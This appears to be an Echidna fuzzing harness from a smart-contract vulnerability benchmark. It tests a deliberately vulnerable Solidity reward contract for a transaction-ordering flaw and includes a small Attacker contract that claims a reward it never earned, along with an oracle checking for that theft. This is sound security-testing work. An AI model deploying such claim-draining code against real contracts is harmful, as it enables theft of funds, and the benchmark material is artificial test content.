pragma solidity ^0.4.16;

// ORDERING-ATTACK / front-running oracle (Mechanism A) wrapping a REAL dataset
// contract: dataset/vulnerable/ordering-attacks/eth_tx_order_dependence_minimal.sol
//
// The owner funds a reward; claimReward() pays out to ANY caller that passes a
// trivial check (submission < 10), so an account that never earned it can take
// the reward -- the substance of the front-running / transaction-ordering bug.
//
// Note: single-trace fuzzing cannot model mempool reordering directly. What it
// demonstrates is the exploitable CONSEQUENCE -- an unprivileged account
// draining the order-dependent reward -- which is the root cause front-running
// exploits. There is no clean (safe) TOD counterpart upstream, so this class is
// represented by a positive sample only (see dataset/DATASET_PROVENANCE.md).
import "../dataset/vulnerable/ordering-attacks/eth_tx_order_dependence_minimal.sol";

contract Attacker {
    function steal(EthTxOrderDependenceMinimal g, uint256 submission) public {
        g.claimReward(submission);
    }
    // Empty payable fallback: accepting ETH must fit in transfer()'s 2300 gas
    // stipend, so it must NOT do a storage write. We measure theft via the
    // attacker's BALANCE instead.
    function () public payable {}
}

contract OrderingEchidnaTest {
    EthTxOrderDependenceMinimal public game;
    Attacker public attacker;
    uint256 public seeded;

    // Payable + funded by Echidna (balanceContract) so the owner can post a reward.
    function OrderingEchidnaTest() public payable {
        game = new EthTxOrderDependenceMinimal();   // owner := this harness
        attacker = new Attacker();
    }

    // The owner (this harness) posts a 1 ETH reward into the game.
    function setup() public {
        if (seeded == 0 && address(this).balance >= 1 ether) {
            game.setReward.value(1 ether)();
            seeded = 1 ether;
        }
    }

    // A NON-owner attacker tries to claim the reward. Guarded on `seeded` so a
    // stray attack() before setup() can't set `claimed` on an empty pot and
    // lock out the reward funding (claimReward sets claimed=true permanently).
    function attack(uint256 submission) public {
        if (seeded > 0) {
            attacker.steal(game, submission);
        }
    }

    // setReward transfers `reward` back to the owner first, so the harness must
    // be able to receive ETH.
    function () public payable {}

    // ORACLE: an account that did not earn the reward must never hold any of it.
    // Echidna finds setup() -> attack(submission < 10) and breaks this.
    function echidna_reward_not_stolen() public view returns (bool) {
        return address(attacker).balance == 0;
    }
}
